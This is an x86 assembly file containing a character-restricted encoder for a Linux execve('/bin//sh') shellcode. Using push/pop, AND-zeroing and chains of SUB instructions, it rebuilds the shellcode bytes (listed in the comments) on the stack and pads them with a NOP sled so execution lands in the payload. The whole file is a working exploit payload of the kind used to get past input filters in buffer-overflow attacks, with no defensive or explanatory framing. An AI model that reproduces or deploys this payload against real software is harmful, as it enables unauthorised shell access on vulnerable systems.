global _start
	_start:
		;========================
		; \x90\x90\x90\x31
		; \xc9\x51\x68\x2f
		; \x2f\x73\x68\x68
		; \x2f\x62\x69\x6e
		; \x89\xe3\x6a\x0b
		; \x58\x99\xcd\x80
		;========================
		;  add esp, 1024
		;========================
		push esp
		pop eax
		; add eax, 1024 <==> sub eax, (2**32 - 1024)
        sub eax, 4d4d4d4dH
        sub eax, 4d4d4d4dH
        sub eax, 65656166H
		push eax
		pop esp
		;========================
		;  set $eax = shellcode[0:-4]
		; \x58\x99\xcd\x80
		; reverse : 
		; \x80\xcd\x99\x58
		;========================
		; set $eax = 0
		and eax, 49494949H
		and eax, 30303030H
sub eax, 2ac02238H
sub eax, 2a392238H
sub eax, 2a392238H
		push eax
		;========================
		;  set $eax = shellcode[-8:-4]
		; \x89\xe3\x6a\x0b
		; reverse : 
		; \x0b\x6a\xe3\x89
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 5232c028H
		sub eax, 51312e28H
		sub eax, 51312e27H
		push eax
		;========================
		;  set $eax = shellcode[-12:-8]
		; \x2f\x62\x69\x6e
		; reverse : 
		; \x6e\x69\x62\x2f
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 31323546H
		sub eax, 30323446H
		sub eax, 30323445H
		push eax
		;========================
		;  set $eax = shellcode[-16:-12]
		; \x2f\x73\x68\x68
		; reverse : 
		; \x68\x68\x73\x2f
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 33332f46H
sub eax, 32322f46H
sub eax, 32322e45H
		push eax
		;========================
		;  set $eax = shellcode[-20:-16]
		; \xc9\x51\x68\x2f
		; reverse : 
		; \x2f\x68\x51\xc9
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 46333ac0H
sub eax, 45323a3cH
sub eax, 4532393bH
		push eax
		;========================
		;  set $eax = shellcode[-21:-20]
		; \x90\x90\x90\x31
		; reverse : 
		; \x31\x90\x90\x90
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 45252526H
sub eax, 45252525H
sub eax, 44252525H
		push eax
		;========================
		;  set $eax = \x90\x90\x90\x90 (nop)
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 25252526H
sub eax, 25252525H
sub eax, 25252525H
		push eax
		;========================
		; fill pad with nop ; then $eip = $esp
		; and the shellcode is going to be excute
		;========================
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
